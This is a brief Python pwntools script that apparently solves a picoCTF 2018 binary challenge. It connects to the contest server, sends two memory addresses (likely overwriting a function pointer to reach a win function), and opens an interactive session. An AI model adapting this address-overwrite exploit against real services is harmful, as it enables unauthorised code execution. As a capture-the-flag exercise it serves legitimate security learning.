#!/usr/bin/env python

from pwn import *

#r = process("./auth")
r = remote("2018shell.picoctf.com", 23731)

r.recvuntil("\n")
r.sendline("0x0804a014")
r.recvuntil("\n")
r.sendline("0x804854b")

r.interactive()
